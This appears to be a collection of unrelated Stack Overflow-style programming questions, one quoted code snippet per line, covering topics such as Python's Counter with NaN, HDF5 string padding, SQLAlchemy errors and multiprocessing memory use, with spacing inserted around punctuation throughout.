"> > > import numpy as np > > > from collections import Counter > > > my_list = [ 1,2,2 , np.nan , np.nan ] > > > Counter ( my_list ) Counter ( { nan : 2 , 2 : 2 , 1 : 1 } ) # Counter treats np.nan as equal and # tells me that I have two of them > > > np.nan == np.nan # However , np.nan 's are not equal False > > > my_list = [ 1,2,2 , float ( 'nan ' ) , float ( 'nan ' ) ] > > > Counter ( my_list ) Counter ( { 2 : 2 , nan : 1 , 1 : 1 , nan : 1 } ) # two different nan 's > > > float ( 'nan ' ) == float ( 'nan ' ) False > > > a = 300 > > > b = 300 > > > a is bFalse > > > Counter ( [ a , b ] ) Counter ( { 300 : 2 } ) X == Y - > FalseandX is Y - > False"
"with open ( file ) as fp : line = fp.readline ( ) cnt = 1 while line : digits=re.findall ( r ' ( [ \d . : ] + ) ' , line ) s=line s = s.replace ( '. ' , '' ) .replace ( ' , ' , ' . ' ) number = float ( s ) cnt += 1"
"def lcs ( s1 , s2 ) : cache = { } if len ( s1 ) == 0 or len ( s2 ) == 0 : return 0 if ( s1 , s2 ) in cache : return cache [ s1 , s2 ] else : if s1 [ -1 ] == s2 [ -1 ] : cache [ s1 , s2 ] = 1 + lcs ( s1 [ : -1 ] , s2 [ : -1 ] ) else : cache [ s1 , s2 ] = max ( lcs ( s1 [ : -1 ] , s2 ) , lcs ( s1 , s2 [ : -1 ] ) ) print cache TypeError : unsupported operand type ( s ) for + : 'int ' and 'NoneType ' return cache [ s1 , s2 ] = 1 + lcs ( s1 [ : -1 ] , s2 [ : -1 ] )"
"ValidationError ( _ ( 'Invalid value ' ) , code='invalid ' )"
print ( `` Mean resistivity : { res } Ohm m '' .format ( res=np.mean ( resistivity ) ) ) Mean resistivity : 1.6628449915450776e-08 Ohm m print ( `` Mean resistivity : { res : .3f } Ohm m '' .format ( res=np.mean ( resistivity ) ) ) Mean resistivity : 0.000 Ohm m Mean resistivity : 1.663e-8 Ohm m
"private static AppDomain CreateSandbox ( ) { var permissions = new PermissionSet ( PermissionState.None ) ; permissions.AddPermission ( new SecurityPermission ( SecurityPermissionFlag.Execution ) ) ; permissions.AddPermission ( new FileIOPermission ( FileIOPermissionAccess.Read| FileIOPermissionAccess.PathDiscovery , AppDomain.CurrentDomain.BaseDirectory ) ) ; var appinfo = new AppDomainSetup ( ) ; appinfo.ApplicationBase = AppDomain.CurrentDomain.BaseDirectory ; return AppDomain.CreateDomain ( `` Scripting sandbox '' , null , appinfo , permissions , fullTrustAssembly ) ; } try { var src = engine.CreateScriptSourceFromString ( s.Python , SourceCodeKind.Statements ) ; src.Execute ( ActionsScope ) ; } catch ( Exception e ) { ExceptionOperations eo = engine.GetService < ExceptionOperations > ( ) ; string error = eo.FormatException ( e ) ; Debug.WriteLine ( error ) ; } System.Security.SecurityException was caught Message=Request failed . Source=Microsoft.Scripting GrantedSet= < PermissionSet class= '' System.Security.PermissionSet '' version= '' 1 '' > < IPermission class= '' System.Security.Permissions.FileIOPermission , mscorlib , Version=4.0.0.0 , Culture=neutral , PublicKeyToken=b77a5c561934e089 '' version= '' 1 '' Read= '' F : \Programming\OCTGN\octgnFX\Octgn\bin\ReleaseMode with Debug\ '' PathDiscovery= '' F : \Programming\OCTGN\octgnFX\Octgn\bin\ReleaseMode with Debug\ '' / > < IPermission class= '' System.Security.Permissions.SecurityPermission , mscorlib , Version=4.0.0.0 , Culture=neutral , PublicKeyToken=b77a5c561934e089 '' version= '' 1 '' Flags= '' Execution '' / > < /PermissionSet > PermissionState= < PermissionSet class= '' System.Security.PermissionSet '' version= '' 1 '' Unrestricted= '' true '' / > RefusedSet= '' '' Url=file : ///F : /Programming/OCTGN/octgnFX/Octgn/bin/ReleaseMode with Debug/Microsoft.Scripting.DLL StackTrace : at Microsoft.Scripting.SyntaxErrorException.GetObjectData ( SerializationInfo info , StreamingContext context ) at System.Runtime.Serialization.ObjectCloneHelper.GetObjectData ( Object serObj , String & typeName , String & assemName , String [ ] & fieldNames , Object [ ] & fieldValues ) at Microsoft.Scripting.Hosting.ScriptSource.Execute ( ScriptScope scope ) at Octgn.Scripting.Engine.LoadScripts ( ) in F : \Programming\OCTGN\octgnFX\Octgn\Scripting\Engine.cs : line 58 InnerException :"
"test = [ [ `` P1 '' , `` P1 '' , `` P1 '' , `` P2 '' , `` P2 '' , `` P1 '' , `` P1 '' , `` P3 '' ] , [ `` P1 '' , `` P1 '' , `` P1 '' ] , [ `` P1 '' , `` P1 '' , `` P1 '' , `` P2 '' ] , [ `` P4 '' ] , [ `` P1 '' , `` P4 '' , `` P2 '' ] , [ `` P1 '' , `` P1 '' , `` P1 '' ] ] from collections import Counterfor item in test : print ( Counter ( item ) ) P1 P2 P3 P415 4 1 2"
"import timeitdef test_slots ( ) : class Obj ( object ) : __slots__ = ( ' i ' , ' l ' ) def __init__ ( self , i ) : self.i = i self.l = [ ] for i in xrange ( 1000 ) : Obj ( i ) print timeit.Timer ( 'test_slots ( ) ' , 'from __main__ import test_slots ' ) .timeit ( 10000 ) timeit ( 10 ) - 0.067stimeit ( 100 ) - 0.5stimeit ( 1000 ) - 19.5stimeit ( 10000 ) - ? ( probably more than a Game of Thrones episode ) import collectionsimport timeitdef test_namedtuples ( ) : Obj = collections.namedtuple ( 'Obj ' , ' i l ' ) for i in xrange ( 1000 ) : Obj ( i , [ ] ) print timeit.Timer ( 'test_namedtuples ( ) ' , 'from __main__ import test_namedtuples ' ) .timeit ( 10000 )"
"gprivate_n = ( 'Co|Inc|Llc|Group|Ltd|Corp|Plc|Sa |Insurance|Ag|As|Media| & |Corporation ' ) df.loc [ df [ df.Name.str.contains ( ' { 0 } '.format ( gprivate_n ) ) ] .index , `` Private '' ] = 1"
"# include < boost/python.hpp > void fun_voidp ( void* ) { } BOOST_PYTHON_MODULE ( tryit ) { using namespace boost : :python ; def ( `` fun_voidp '' , fun_voidp ) ; } import tryitimport ctypesb = bytearray ( 100 ) tryit.fun_voidp ( b ) # failtryit.fun_voidp ( ctypes.c_void_p.from_buffer ( b ) ) # failtryit.fun_voidp ( ctypes.c_void_p.from_buffer ( b ) .value ) # fail"
"class TrustmileDelivery ( db.Model , UniqueMixin , TableColumnsBase ) : __tablename__ = 'trustmile_delivery ' articles = one_to_many ( 'Article ' , backref='delivery ' , lazy='select ' ) # Problem with this is getting a cascade error neighbour = many_to_one ( 'ConsumerUser ' , backref='trustmile_deliveries ' , lazy='select ' ) courier_user = many_to_one ( 'CourierUser ' , backref='deliveries ' , lazy='select ' ) state = db.Column ( db.String ( 255 ) , ) @ classmethod def create ( cls , user , articles ) : return TrustmileDelivery ( user , articles ) def __init__ ( self , courier_user , articles ) : self.courier_user = courier_user if len ( articles ) : self.articles.append ( articles ) Traceback ( most recent call last ) : File `` /Users/james/Documents/workspace/trustmile-backend/trustmile/tests/test_deliveries.py '' , line 66 , in test_create_trustmile_delivery tm_delivery = TrustmileDelivery.create ( courier_user , articles ) File `` /Users/james/Documents/workspace/trustmile-backend/trustmile/app/deliveries/model.py '' , line 419 , in create return TrustmileDelivery ( user , articles ) File `` < string > '' , line 4 , in __init__ File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/state.py '' , line 306 , in _initialize_instance manager.dispatch.init_failure ( self , args , kwargs ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/util/langhelpers.py '' , line 60 , in __exit__ compat.reraise ( exc_type , exc_value , exc_tb ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/state.py '' , line 303 , in _initialize_instance return manager.original_init ( *mixed [ 1 : ] , **kwargs ) File `` /Users/james/Documents/workspace/trustmile-backend/trustmile/app/deliveries/model.py '' , line 408 , in __init__ self.articles.append ( articles ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/collections.py '' , line 1072 , in append item = __set ( self , item , _sa_initiator ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/collections.py '' , line 1044 , in __set item = executor.fire_append_event ( item , _sa_initiator ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/collections.py '' , line 716 , in fire_append_event item , initiator ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/attributes.py '' , line 936 , in fire_append_event initiator or self._append_token or self._init_append_token ( ) ) File `` /Users/james/.virtualenvs/trustmile-api-p2710/lib/python2.7/site-packages/sqlalchemy/orm/unitofwork.py '' , line 42 , in append item_state = attributes.instance_state ( item ) AttributeError : 'list ' object has no attribute '_sa_instance_state '"
"lst = [ 0 for _ in range ( 1000000 ) ] + [ 1 ] def gt_0 ( lst ) : for elm in lst : if elm > 0 : return True return False > > % timeit any ( elm > 0 for elm in lst ) > > 10 loops , best of 3 : 35.9 ms per loop > > % timeit gt_0 ( lst ) > > 100 loops , best of 3 : 16 ms per loop"
"import sympy as spq , qm , k , c0 , c , vt , vm = sp.symbols ( ' q qm k c0 c vt vm ' ) c = ( c0 * vt - q * vm ) / vteq1 = sp.Eq ( qm * k * c / ( 1 + k * c ) , q ) q_solve = sp.solve ( eq1 , q )"
"flask.request.form.getlist ( 'selected_user ' ) ImmutableMultiDict ( [ ( '_xsrf_token ' , u'an_xsrf_token_would_go_here ' ) , ( 'selected_user ' , u ' { u\'primaryEmail\ ' : u\'some_value\ ' } ' ... ) , ( 'selected_user ' , u ' { u\'primaryEmail\ ' : u\'some_value\ ' } ' ... ) ] ) mock_users = [ ] for x in range ( 0 , len ( FAKE_EMAILS_AND_NAMES ) ) : mock_user = { } mock_user [ 'primaryEmail ' ] = FAKE_EMAILS_AND_NAMES [ x ] [ 'email ' ] mock_user [ 'name ' ] = { } mock_user [ 'name ' ] [ 'fullName ' ] = FAKE_EMAILS_AND_NAMES [ x ] [ 'name ' ] mock_users.append ( mock_user ) data = { } data [ 'selected_user ' ] = mock_usersresponse = self.client.post ( flask.url_for ( 'add_user ' ) , data=data , follow_redirects=False ) add_file ( ) got an unexpected keyword argument 'primaryEmail ' data = [ ] for x in range ( 0 , 3 ) : my_tuple = ( 'selected_user ' , mock_users [ x ] ) data.append ( my_tuple )"
"echo `` Hello '' | ./script.sh # ! /bin/bashCAPTURE_FILE=/var/log/capture_dataenv > > $ { CAPTURE_FILE } exit 1 # ! /usr/bin/env pythonimport osimport sysdef capture ( ) : log = os.environ data = open ( `` /tmp/capture.log '' , `` a '' ) for key in log.keys ( ) : data.write ( ( key ) ) data.write ( `` : `` ) for n in log [ key ] : data.write ( ' % s ' % ( ( n ) ) ) data.write ( `` \n '' ) data.close ( ) sys.exit ( 1 ) def main ( ) : capture ( ) if __name__ == `` __main__ '' : main ( )"
"# include < hdf5.h > int main ( void ) { auto file = H5Fcreate ( `` test-c.h5 '' , H5F_ACC_TRUNC , H5P_DEFAULT , H5P_DEFAULT ) ; char strings [ 5 ] [ 64 ] = { `` please work 0 '' , `` please work 1 '' , `` please work 2 '' , `` please work 3 '' , `` please work 4 '' } ; auto H5T_C_S1_64 = H5Tcopy ( H5T_C_S1 ) ; H5Tset_size ( H5T_C_S1_64 , 64 ) ; hsize_t dims [ 1 ] = { 5 } ; auto dataspace = H5Screate_simple ( 1 , dims , NULL ) ; auto dataset = H5Dcreate ( file , `` test dataset '' , H5T_C_S1_64 , dataspace , H5P_DEFAULT , H5P_DEFAULT , H5P_DEFAULT ) ; H5Dwrite ( dataset , H5T_C_S1_64 , H5S_ALL , H5S_ALL , H5P_DEFAULT , strings ) ; H5Dclose ( dataset ) ; H5Sclose ( dataspace ) ; H5Tclose ( H5T_C_S1_64 ) ; H5Fclose ( file ) ; return 0 ; } env = Environment ( ) env.Append ( LIBS= [ 'hdf5 ' ] , CPPFLAGS= [ '-std=c++11 ' ] ) env.Program ( 'writeh5 ' , 'main.cpp ' ) import h5pyhdf5 = h5py.File ( 'test-p.h5 ' , ' w ' ) H5T_C_S1_64 = h5py.h5t.C_S1.copy ( ) H5T_C_S1_64.set_size ( 64 ) print `` Null Terminated String : % s '' % ( H5T_C_S1_64.get_strpad ( ) == h5py.h5t.STR_NULLTERM ) dataset = hdf5.create_dataset ( 'test dataset ' , ( 5 , ) , data= [ 'please work % s ' % n for n in xrange ( 5 ) ] , dtype=H5T_C_S1_64 ) hdf5.close ( ) > > python -- versionPython 2.7.11 > > python -c `` import h5py ; print h5py.version.version '' 2.5.0 > > tree.├── main.cpp├── main.py└── SConstruct0 directories , 3 files > > sconsscons : Reading SConscript files ... scons : done reading SConscript files.scons : Building targets ... g++ -o main.o -c -std=c++11 main.cppg++ -o writeh5 main.o -lhdf5scons : done building targets. > > tree.├── main.cpp├── main.o├── main.py├── SConstruct└── writeh50 directories , 5 files > > ./writeh5 > > tree.├── main.cpp├── main.o├── main.py├── SConstruct├── test-c.h5└── writeh50 directories , 6 files > > python main.pyNull Terminated String : True > > tree.├── main.cpp├── main.o├── main.py├── SConstruct├── test-c.h5├── test-p.h5└── writeh50 directories , 7 files > > h5dump test-c.h5 HDF5 `` test-c.h5 '' { GROUP `` / '' { DATASET `` test dataset '' { DATATYPE H5T_STRING { STRSIZE 64 ; STRPAD H5T_STR_NULLTERM ; CSET H5T_CSET_ASCII ; CTYPE H5T_C_S1 ; } DATASPACE SIMPLE { ( 5 ) / ( 5 ) } DATA { ( 0 ) : `` please work 0 '' , `` please work 1 '' , `` please work 2 '' , ( 3 ) : `` please work 3 '' , `` please work 4 '' } } } } > > h5dump test-p.h5HDF5 `` test-p.h5 '' { GROUP `` / '' { DATASET `` test dataset '' { DATATYPE H5T_STRING { STRSIZE 64 ; STRPAD H5T_STR_NULLPAD ; CSET H5T_CSET_ASCII ; CTYPE H5T_C_S1 ; } DATASPACE SIMPLE { ( 5 ) / ( 5 ) } DATA { ( 0 ) : `` please work 0\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000 '' , ( 1 ) : `` please work 1\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000 '' , ( 2 ) : `` please work 2\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000 '' , ( 3 ) : `` please work 3\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000 '' , ( 4 ) : `` please work 4\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000 '' } } } }"
"# ! /usr/bin/python # # This script was written by Norio TAKEMOTO 2012-5-7import matplotlib.pyplot as pltfrom matplotlib.patches import ConnectionPatch # creating a figure and axes.fig=plt.figure ( figsize= ( 10,5 ) ) ax1=plt.axes ( [ 0.05,0.15,0.40,0.80 ] ) plt.xticks ( [ 0 ] ) plt.yticks ( [ 0 ] ) plt.xlim ( ( -1.23 , 1.23 ) ) plt.ylim ( ( -2.34 , 2.34 ) ) ax2=plt.axes ( [ 0.60,0.15 , 0.30 , 0.30 ] ) plt.xticks ( [ 0 ] ) plt.yticks ( [ 0 ] ) plt.xlim ( ( -3.45 , 3.45 ) ) plt.ylim ( ( -4.56 , 4.56 ) ) # trying to connect the point ( 0,0 ) in ax1 and the point ( 0,0 ) in ax2 # by an arrow , but some part is hidden . I ca n't find a solution . Let 's # ask stackoverflow. # xy_A_ax1= ( 0,0 ) # xy_B_ax2= ( 0,0 ) # # inv1 = ax1.transData.inverted ( ) # xy_B_display = ax2.transData.transform ( xy_B_ax2 ) # xy_B_ax1 = inv1.transform ( xy_B_display ) # ax1.annotate ( 'Wundaba ' , xy= ( 0 , 0 ) , xytext=xy_B_ax1 , # xycoords='data ' , textcoords='data ' , # arrowprops=dict ( arrowstyle='- > ' ) ) con = ConnectionPatch ( xyA= ( 0 , 0 ) , xyB= ( 0 , 0 ) , coordsA='data ' , coordsB='data ' , axesA=ax1 , axesB=ax2 , arrowstyle='- > ' , clip_on=False ) ax1.add_artist ( con ) plt.savefig ( 'fig1.eps ' ) plt.savefig ( 'fig1.png ' )"
"from django.db import modelsfrom django.contrib.auth.models import UserSTATUS_CHOICES = ( ( 1 , 'Accepted ' ) , ( 0 , 'Rejected ' ) , ) class Leave ( models.Model ) : -- -- -- -- -- -- -- -- status = models.IntegerField ( choices=STATUS_CHOICES , default = 0 ) reason_reject = models.CharField ( ( 'reason for rejection ' ) , max_length=50 , blank=True ) def __str__ ( self ) : return self.name from django.contrib import adminfrom .models import Leave @ admin.register ( Leave ) class LeaveAdmin ( admin.ModelAdmin ) : -- -- -- -- -- -- -- -- - class Media : js = ( '/static/admin/js/admin.js ' ) ( function ( $ ) { $ ( function ( ) { var reject = document.getElementById ( 'id_status_0 ' ) var accept = document.getElementById ( `` id_status_1 '' ) var reason_reject = document.getElementById ( `` id_reason_reject '' ) if ( accept.checked == true ) { reason_reject.style.display = `` none '' } else { reason_reject.style.display = `` block '' } } ) ; } ) ( django.jQuery ) ;"
"class Author ( Model ) : __abstract__ = True id = db.Column ( db.Integer , primary_key=True ) name = db.Column ( db.String ) class AmericanAuthor ( Author ) : __tablename__ = 'american_author ' # some other stuffclass BritishAuthor ( Author ) : __tablename__ = 'british_author ' # some other stuffclass Book ( Model ) : __tablename__ = 'book ' title = db.Column ( db.String ) author_id = db.Column ( db.Integer , db.ForeignKey ( `` author.id '' ) ) sqlalchemy.exc.NoReferencedTableError : Foreign key associated with column 'books.author_id ' could not find table 'author ' with which to generate a foreign key to target column 'id '"
"top_brands = [ 'Coca Cola ' , 'Apple ' , 'Victoria\ 's Secret ' , ... . ] row item_title brand_name1 | Apple 6S | Apple2 | New Victoria\ 's Secret | missing < -- need to fill with Victoria\ 's Secret3 | Used Samsung TV | missing < -- need fill with Samsung4 | Used bike | missing < -- No need to do anything because there is no brand_name in the title ... . def get_brand_name ( row ) : if row [ 'brand_name ' ] ! = 'missing ' : return row [ 'brand_name ' ] item_title = row [ 'item_title ' ] for brand in top_brands : brand_start = brand + ' ' brand_in_between = ' ' + brand + ' ' brand_end = ' ' + brand if ( ( brand_in_between in item_title ) or item_title.endswith ( brand_end ) or item_title.startswith ( brand_start ) ) : print ( brand ) return brand return 'missing ' # # # end of get_brand_nameitems [ 'brand_name ' ] = items.apply ( lambda x : get_brand_name ( x ) , axis=1 )"
"import numpy as npimport multiprocessing as mpimport loggingdef memory ( ) : `` '' '' Get node total memory and memory usage `` '' '' with open ( '/proc/meminfo ' , ' r ' ) as mem : ret = { } tmp = 0 for i in mem : sline = i.split ( ) if str ( sline [ 0 ] ) == 'MemTotal : ' : ret [ 'total ' ] = int ( sline [ 1 ] ) elif str ( sline [ 0 ] ) in ( 'MemFree : ' , 'Buffers : ' , 'Cached : ' ) : tmp += int ( sline [ 1 ] ) ret [ 'free ' ] = tmp ret [ 'used ' ] = int ( ret [ 'total ' ] ) - int ( ret [ 'free ' ] ) return retif __name__ == '__main__ ' : import argparse parser = argparse.ArgumentParser ( ) parser.add_argument ( ' -- pool_first ' , action='store_true ' ) parser.add_argument ( ' -- call_map ' , action='store_true ' ) args = parser.parse_args ( ) if args.pool_first : logging.debug ( 'start : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) p = mp.Pool ( ) logging.debug ( 'pool created : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) biggish_matrix = np.ones ( ( 50000,5000 ) ) logging.debug ( 'matrix created : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) print memory ( ) [ 'free ' ] else : logging.debug ( 'start : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) biggish_matrix = np.ones ( ( 50000,5000 ) ) logging.debug ( 'matrix created : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) p = mp.Pool ( ) logging.debug ( 'pool created : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) print memory ( ) [ 'free ' ] if args.call_map : row_sums = p.map ( sum , biggish_matrix ) logging.debug ( 'sum mapped : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) p.terminate ( ) p.join ( ) logging.debug ( 'pool terminated : \n\t { } \n'.format ( ' '.join ( [ ' { } : { } '.format ( k , v ) for k , v in memory ( ) .items ( ) ] ) ) ) # ! /bin/bashrm pool_first_obs.txt > /dev/null 2 > & 1 ; rm matrix_first_obs.txt > /dev/null 2 > & 1 ; for ( ( n=0 ; n < 100 ; n++ ) ) ; do python pool_memory_test.py -- pool_first > > pool_first_obs.txt ; python pool_memory_test.py > > matrix_first_obs.txt ; done library ( ggplot2 ) library ( reshape2 ) pool_first = as.numeric ( readLines ( 'pool_first_obs.txt ' ) ) matrix_first = as.numeric ( readLines ( 'matrix_first_obs.txt ' ) ) df = data.frame ( i=seq ( 1,100 ) , pool_first , matrix_first ) ggplot ( data=melt ( df , id.vars= ' i ' ) , aes ( x=i , y=value , color=variable ) ) + geom_point ( ) + geom_smooth ( ) + xlab ( 'iteration ' ) + ylab ( 'free memory ' ) + ggsave ( 'multiprocessing_pool_memory.png ' )"
"a= [ [ '10 ' , 'name_1 ' ] , [ '50 ' , 'name_2 ' ] , [ '40 ' , 'name_3 ' ] , ... , [ '80 ' , 'name_N ' ] ] b= [ ( 10,40 ) , ( 40,60 ) , ( 60,90 ) , ( 90,100 ) ] c= [ [ [ '10 ' , 'name_1 ' ] ] , [ [ '50 ' , 'name_2 ' ] , [ '40 ' , 'name_3 ' ] ] , [ ... , [ '80 ' , 'name_N ' ] ] ]"
"import setuptoolsassert setuptools.__version__ > = '36.0'setuptools.setup ( ) [ metadata ] name = foobarversion = 1.6.5+0.1.0 [ options ] packages = find : install_requires = ham > = 0.1.0 eggs > = 8.1.2 spam > = 1.2.3 ; platform_system== '' Darwin '' i-love-spam > = 1.2.0 ; platform_system= '' Darwin '' pip._vendor.pkg_resources.RequirementParseError : Invalid requirement , parse error at `` ' ; platfo ' ''"
"from functools import partialdef add ( x , y , z , a ) : return x + y + z + alist_of_as = list ( range ( 10000 ) ) def max1 ( ) : return max ( list_of_as , key=lambda a : add ( 10 , 20 , 30 , a ) ) def max2 ( ) : return max ( list_of_as , key=partial ( add , 10 , 20 , 30 ) ) In [ 2 ] : % timeit max1 ( ) 4.36 ms ± 42.3 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each ) In [ 3 ] : % timeit max2 ( ) 3.67 ms ± 25.9 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each ) In [ 3 ] : % timeit max2 ( ) # using ` partial ` implementation from docs 10.7 ms ± 267 µs per loop ( mean ± std . dev . of 7 runs , 100 loops each )"
"\begin { abstract } ... ..\end { abstract } A = re.findall ( r'\\begin { abstract } ( .* ? ) \\end { abstract } ' , data )"
"stats = callbacks.AggregateStats ( ) playbook_cb = callbacks.PlaybookCallbacks ( verbose=1 ) runner_cb = callbacks.PlaybookRunnerCallbacks ( stats , verbose=1 ) pb = ansible.playbook.PlayBook ( ... # basic info ) results = pb.run ( ) { `` status '' : 1 , `` result '' : { `` 127.0.0.1 '' : { `` unreachable '' : 0 , `` skipped '' : 0 , `` ok '' : 3 , `` changed '' : 2 , `` failures '' : 0 } } } changed : [ 127.0.0.1 ] = > { `` changed '' : true , `` name '' : `` apache2 '' , `` state '' : `` started '' } from ansible import constants as CC.DEFAULT_LOG_PATH = 'project.log'reload ( callbacks )"
"lVals = [ 1 , 01 , 2011 ] > > > a = [ 26 , 08 , 2011 ] File `` < stdin > '' , line 1 a = [ 26 , 08 , 2011 ] ^SyntaxError : invalid token"
"> > > 1/1e-3081e+308 > > > 1/1e-309inf > > > 1/1e-323inf > > > 1/1e-324Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > ZeroDivisionError : float division by zero"
"Details about New Men 's Genuine Leather Bifold ID Credit Card Money Holder Wallet Black New Men 's Genuine Leather Bifold ID Credit Card Money Holder Wallet Black < h1 class= '' it-ttl '' itemprop= '' name '' id= '' itemTitle '' > < span class= '' g-hdn '' > Details about & nbsp ; < /span > New Men & # 039 ; s Genuine Leather Bifold ID Credit Card Money Holder Wallet Black < /h1 > for line in soup.find_all ( 'h1 ' , attrs= { 'itemprop ' : 'name ' } ) : print line.get_text ( )"
"imagefile = flask.request.files [ 'imagefile ' ] filename_ = str ( datetime.datetime.now ( ) ) .replace ( ' ' , ' _ ' ) + \ werkzeug.secure_filename ( imagefile.filename ) filename = os.path.join ( UPLOAD_FOLDER , filename_ ) imagefile.save ( filename ) logging.info ( 'Saving to % s . ' , filename ) image = exifutil.open_oriented_im ( filename )"
"app.run ( host= ' 0.0.0.0 ' , port=port , ssl_context='adhoc ' ) ( myapp ) $ pip install pyopenssl ( myapp ) $ foreman start10:35:25 web.1 | started with pid 2693410:35:26 web.1 | * Running on https : //0.0.0.0:5000/10:35:26 web.1 | * Restarting with reloader 10:35:31 web.1 | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 10:35:31 web.1 | Exception happened during processing of request from ( '127.0.0.1 ' , 61118 ) 10:35:31 web.1 | Traceback ( most recent call last ) :10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 284 , in _handle_request_noblock10:35:31 web.1 | self.process_request ( request , client_address ) 10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 310 , in process_request10:35:31 web.1 | self.finish_request ( request , client_address ) 10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 323 , in finish_request10:35:31 web.1 | self.RequestHandlerClass ( request , client_address , self ) 10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 639 , in __init__10:35:31 web.1 | self.handle ( ) 10:35:31 web.1 | File `` path_to_myapp/lib/python2.7/site-packages/werkzeug/serving.py '' , line 189 , in handle10:35:31 web.1 | return rv10:35:31 web.1 | UnboundLocalError : local variable 'rv ' referenced before assignment10:35:31 web.1 | -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 10:35:31 web.1 | Unhandled exception in thread started by < function inner at 0x10139e050 > 10:35:31 web.1 | Traceback ( most recent call last ) :10:35:31 web.1 | File `` path_to_myapp/lib/python2.7/site-packages/werkzeug/serving.py '' , line 599 , in inner10:35:31 web.1 | passthrough_errors , ssl_context ) .serve_forever ( ) 10:35:31 web.1 | File `` path_to_myapp/lib/python2.7/site-packages/werkzeug/serving.py '' , line 355 , in serve_forever10:35:31 web.1 | HTTPServer.serve_forever ( self ) 10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 227 , in serve_forever10:35:31 web.1 | self._handle_request_noblock ( ) 10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 287 , in _handle_request_noblock10:35:31 web.1 | self.shutdown_request ( request ) 10:35:31 web.1 | File `` /usr/local/Cellar/python/2.7.1/lib/python2.7/SocketServer.py '' , line 459 , in shutdown_request10:35:31 web.1 | request.shutdown ( socket.SHUT_WR ) 10:35:31 web.1 | TypeError : shutdown ( ) takes exactly 0 arguments ( 1 given )"
class Post ( models.Model ) : `` '' '' Class for posts . Attributes : title ( str ) : Post title. `` '' '' title = models.CharField ( max_length=120 )
"p_type= [ ] s_type= [ ] query = request.GET.get ( `` q '' ) p_type =request.GET.get ( `` p_type '' ) s_type = request.GET.get ( `` s_type '' ) # messages.add_message ( request , messages.INFO , p_type ) # messages.add_message ( request , messages.INFO , s_type ) if query : queryset_find = queryset_list.filter ( Q ( FP_Item__contains=query ) ) context = { 'object_list ' : queryset_find } return render ( request , 'index.html ' , context ) elif p_type : queryset_find = queryset_list.filter ( Q ( p_type__contains=s_type ) ) context = { 'object_list ' : queryset_find } return render ( request , 'index.html ' , context ) else : context = { 'object_list ' : queryset } return render ( request , 'index.html ' , context ) Q ( p_type__contains=s_type ) ) Exception Type : FieldErrorException Value : Can not resolve keyword 'p_type ' into field . Choices are : ... ( same choices which I am using with my database ) . class RFP ( models.Model ) : FP_Item = models.TextField ( max_length=1500 ) P_63 = models.TextField ( max_length=1000 ) P_64 = models.TextField ( max_length=1000 )"
